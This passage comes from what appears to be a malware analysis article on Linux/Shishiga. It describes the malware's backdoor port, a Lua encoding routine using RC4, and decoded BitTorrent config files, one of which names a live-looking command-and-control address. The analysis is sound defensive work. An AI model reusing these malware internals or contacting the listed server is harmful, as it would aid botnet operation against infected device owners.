</span>ПЛАНУ</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->

</div>
</div>
<div class="paragraph">
<p>This translates to:</p>
</div>
<div class="listingblock">
<div class="content">
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282db991940740" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
            EVERYTHING GOES ACCORDING TO PLAN

When we get communism it'll all be fucking great.
It will come soon, we just have to wait.
Everything will be free there, everything will be fun.
We'll probably not even have to die.
I woke up in the middle of the night and realized

            EVERYTHING GOES ACCORDING TO PLAN</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282db991940740-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282db991940740-2">2</div><div class="crayon-num" data-line="crayon-60581b86282db991940740-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282db991940740-4">4</div><div class="crayon-num" data-line="crayon-60581b86282db991940740-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282db991940740-6">6</div><div class="crayon-num" data-line="crayon-60581b86282db991940740-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282db991940740-8">8</div><div class="crayon-num" data-line="crayon-60581b86282db991940740-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282db991940740-1"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">EVERYTHING </span><span class="crayon-e">GOES </span><span class="crayon-e">ACCORDING </span><span class="crayon-st">TO</span><span class="crayon-h"> </span><span class="crayon-e">PLAN</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282db991940740-2">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282db991940740-3"><span class="crayon-e">When </span><span class="crayon-e">we </span><span class="crayon-e">get </span><span class="crayon-e">communism </span><span class="crayon-i">it</span><span class="crayon-s">'ll all be fucking great.</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282db991940740-4"><span class="crayon-s">It will come soon, we just have to wait.</span></div><div class="crayon-line" id="crayon-60581b86282db991940740-5"><span class="crayon-s">Everything will be free there, everything will be fun.</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282db991940740-6"><span class="crayon-s">We'</span><span class="crayon-e">ll </span><span class="crayon-e">probably </span><span class="crayon-st">not</span><span class="crayon-h"> </span><span class="crayon-e">even </span><span class="crayon-e">have </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-v">die</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-60581b86282db991940740-7"><span class="crayon-i">I</span><span class="crayon-h"> </span><span class="crayon-e">woke </span><span class="crayon-e">up </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">the </span><span class="crayon-e">middle </span><span class="crayon-e">of </span><span class="crayon-e">the </span><span class="crayon-e">night </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-e">realized</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282db991940740-8">&nbsp;</div><div class="crayon-line" id="crayon-60581b86282db991940740-9"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">EVERYTHING </span><span class="crayon-e">GOES </span><span class="crayon-e">ACCORDING </span><span class="crayon-st">TO</span><span class="crayon-h"> </span><span class="crayon-v">PLAN</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->

</div>
</div>
<div class="paragraph">
<p>It seems that the malware author was inspired by <a href="https://en.wikipedia.org/wiki/Grazhdanskaya_Oborona">E.Letov</a> and his album <code>Everything goes according to plan</code> &#8211; see the <a href="http://www.gr-oborona.ru/texts/1056899068.html" target="_blank" rel="noopener">last verse</a> of the title song.</p>
</div>
<div class="paragraph">
<p>Over the past few weeks, we observed some minor changes like parts of some modules being rewritten, addition of testing modules, removal of redundant files, but nothing especially noteworthy.</p>
</div>
<div class="paragraph">
<p>While the main binary is named <code>&lt;architecture&gt;.lm</code>, we also managed to retrieve binaries with the following name <code>&lt;architecture&gt;.dm</code> &#8211; a simple backdoor that listens on <code>0.0.0.0</code> (all IPv4 addresses) port <code>2015</code>. One of the small changes was in the name of this backdoor binary &#8211; it changed from <code>dl</code> to <code>dm</code>.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_shishiga_communication">Shishiga communication</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Linux/Shishiga can communicate using any of the modules <code>httpproto.lua</code>, <code>btloader.lua</code> or <code>server.lua</code>. The <code>httpproto.lua</code> module has functions that allow the given data to be encoded or decoded, and make HTTP POST and GET requests. The source code below shows the process of encoding data.</p>
</div>
<div class="listingblock">
<div class="title">httpproto.lua</div>
<div>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282dc918072415" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
[...]
function httpproto.encode(data)
    local msg=bencode.encode(data)
    local c=zlib.crc32()(msg)
    local k=string.pack("&lt;I",utils.random())
    return k..crypto.rc4(k,string.pack("&lt;I",c)..msg)
end
[...]</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282dc918072415-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282dc918072415-2">2</div><div class="crayon-num" data-line="crayon-60581b86282dc918072415-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282dc918072415-4">4</div><div class="crayon-num" data-line="crayon-60581b86282dc918072415-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282dc918072415-6">6</div><div class="crayon-num" data-line="crayon-60581b86282dc918072415-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282dc918072415-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282dc918072415-1"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282dc918072415-2"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-v">httpproto</span><span class="crayon-sy">.</span><span class="crayon-e">encode</span><span class="crayon-sy">(</span><span class="crayon-v">data</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282dc918072415-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">local </span><span class="crayon-v">msg</span><span class="crayon-o">=</span><span class="crayon-v">bencode</span><span class="crayon-sy">.</span><span class="crayon-e">encode</span><span class="crayon-sy">(</span><span class="crayon-v">data</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282dc918072415-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">local</span><span class="crayon-h"> </span><span class="crayon-v">c</span><span class="crayon-o">=</span><span class="crayon-v">zlib</span><span class="crayon-sy">.</span><span class="crayon-e">crc32</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-v">msg</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282dc918072415-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">local</span><span class="crayon-h"> </span><span class="crayon-v">k</span><span class="crayon-o">=</span><span class="crayon-t">string</span><span class="crayon-sy">.</span><span class="crayon-e">pack</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;I"</span><span class="crayon-sy">,</span><span class="crayon-v">utils</span><span class="crayon-sy">.</span><span class="crayon-e">random</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282dc918072415-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">k</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-v">crypto</span><span class="crayon-sy">.</span><span class="crayon-e">rc4</span><span class="crayon-sy">(</span><span class="crayon-v">k</span><span class="crayon-sy">,</span><span class="crayon-t">string</span><span class="crayon-sy">.</span><span class="crayon-e">pack</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;I"</span><span class="crayon-sy">,</span><span class="crayon-v">c</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-v">msg</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b86282dc918072415-7"><span class="crayon-st">end</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282dc918072415-8"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->

</div>
</div>
<div class="paragraph">
<p><code>btloader.lua</code> uses the <code>torrent.lua</code> module (a wrapper for BitTorrent functions) to save or load nodes from the <code>nodes.cfg</code> file. It also retrieves its configuration data from <code>{server,update,script}.bt</code> files (in <a href="https://en.wikipedia.org/wiki/Bencode" target="_blank" rel="noopener">Bencode</a> format) and uses the BitTorrent protocol to check for new versions of these files. <code>script.bt</code> allows the execution of a Lua script and <code>update.bt</code> allows executing the <code>.lm</code> binary. Below are examples of decoded .bt files shown as Python dictionaries.</p>
<p>script.bt</p>
</div>
<div>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282dd669036560" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
{
    'sig': &amp;lt;removed&amp;gt;,1
    'k': &amp;lt;removed&amp;gt;,2
    'salt': 'script',
    'seq': 1486885364,
    'v': 'caba4dbe2f7add9371b94b97cf0d351b72449072,test.lua\n'
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282dd669036560-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282dd669036560-2">2</div><div class="crayon-num" data-line="crayon-60581b86282dd669036560-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282dd669036560-4">4</div><div class="crayon-num" data-line="crayon-60581b86282dd669036560-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282dd669036560-6">6</div><div class="crayon-num" data-line="crayon-60581b86282dd669036560-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282dd669036560-1"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282dd669036560-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'sig'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">removed</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-60581b86282dd669036560-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'k'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">removed</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-sy">,</span><span class="crayon-cn">2</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282dd669036560-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'salt'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">'script'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282dd669036560-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'seq'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1486885364</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282dd669036560-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'v'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">'caba4dbe2f7add9371b94b97cf0d351b72449072,test.lua\n'</span></div><div class="crayon-line" id="crayon-60581b86282dd669036560-7"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->

</div>
<div class="colist arabic">
<table>
<tbody>
<tr>
<td><b>(1)</b></td>
<td>signature</td>
</tr>
<tr>
<td><i class="conum" data-value="2"></i><b>(2)</b></td>
<td>public key</td>
</tr>
</tbody>
</table>
</div>
<div class="listingblock">
<div class="title">update.bt</div>
<div>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282de959201391" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
{
    'sig': &amp;lt;removed&amp;gt;,
    'k': &amp;lt;removed&amp;gt;,
    'salt': 'update',
    'seq': 1486885364,
    'v':
        'bf4d9e25fc210a1d9809aebb03b30748dd588d08,mipsel.lm\n
        8a0d58472f6166ade0ae677bab7940fe38d66d35,armv4l.lm\n
        51a4ca78ebb0649721ae472290bea7bfe983d727,mips.lm\n
        979fb376d6adc65473c4f51ad1cc36e3612a1e73,powerpc.lm\n
        ce4b3c92a96137e6215a5e2f5fd28a672eddaaab,i686.lm\n'
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282de959201391-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282de959201391-2">2</div><div class="crayon-num" data-line="crayon-60581b86282de959201391-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282de959201391-4">4</div><div class="crayon-num" data-line="crayon-60581b86282de959201391-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282de959201391-6">6</div><div class="crayon-num" data-line="crayon-60581b86282de959201391-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282de959201391-8">8</div><div class="crayon-num" data-line="crayon-60581b86282de959201391-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282de959201391-10">10</div><div class="crayon-num" data-line="crayon-60581b86282de959201391-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282de959201391-12">12</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282de959201391-1"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282de959201391-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'sig'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">removed</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282de959201391-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'k'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">removed</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282de959201391-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'salt'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">'update'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282de959201391-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'seq'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1486885364</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282de959201391-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'v'</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-60581b86282de959201391-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'bf4d9e25fc210a1d9809aebb03b30748dd588d08,mipsel.lm\n</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282de959201391-8"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8a0d58472f6166ade0ae677bab7940fe38d66d35,armv4l.lm\n</span></div><div class="crayon-line" id="crayon-60581b86282de959201391-9"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;51a4ca78ebb0649721ae472290bea7bfe983d727,mips.lm\n</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282de959201391-10"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;979fb376d6adc65473c4f51ad1cc36e3612a1e73,powerpc.lm\n</span></div><div class="crayon-line" id="crayon-60581b86282de959201391-11"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ce4b3c92a96137e6215a5e2f5fd28a672eddaaab,i686.lm\n'</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282de959201391-12"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->

</div>
</div>
<div class="listingblock">
<div class="title">server.bt</div>
<div>
<!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282df310469609" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
{
    'sig': &amp;lt;removed&amp;gt;,
    'k': &amp;lt;removed,
    'salt': 'server',
    'seq': 1486835166,
    'v': '93.117.137.35:8080\n'
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b86282df310469609-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282df310469609-2">2</div><div class="crayon-num" data-line="crayon-60581b86282df310469609-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282df310469609-4">4</div><div class="crayon-num" data-line="crayon-60581b86282df310469609-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b86282df310469609-6">6</div><div class="crayon-num" data-line="crayon-60581b86282df310469609-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b86282df310469609-1"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282df310469609-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'sig'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">removed</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282df310469609-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'k'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">removed</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282df310469609-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'salt'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">'server'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581b86282df310469609-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'seq'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1486835166</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b86282df310469609-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'v'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">'93.117.137.35:8080\n'</span></div><div class="crayon-line" id="crayon-60581b86282df310469609-7"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->

</div>
</div>
<div class="paragraph">
<p>Finally, the <code>server.lua</code> module’s main functionality is to create an HTTP server with the port defined in <code>config.lua</code>. In all samples we have analyzed so far, that is port 8888.</p>
</div>
<div class="paragraph">
<p>The server responds only to <code>/info</code> and <code>/upload</code> requests. Below is a (prettified) version of the server response to the <code>/info</code> path. All of the files below can be easily downloaded from the infected device.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b86282e0441356034" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
